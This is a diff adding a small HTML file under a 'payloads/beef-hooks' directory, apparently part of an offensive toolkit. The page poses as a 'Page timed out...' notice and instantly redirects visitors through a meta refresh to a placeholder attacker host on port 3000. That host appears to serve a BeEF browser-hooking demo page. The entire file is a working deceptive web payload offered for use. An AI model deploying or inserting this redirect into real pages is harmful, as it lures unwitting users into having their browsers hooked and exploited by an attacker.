+++ payloads/beef-hooks/beef_redirect
@@ -1,0 +1,10 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="content-type" content="application/xhtml+xml; charset=iso-8859-1" />
+    <title>Page timed out...</title>
+  </head>
+  <body>
+    <meta HTTP-EQUIV="REFRESH" content="0; url=http://<IP-ADDRESS>:3000/demos/butcher/index.html">
+  </body>
+</html>
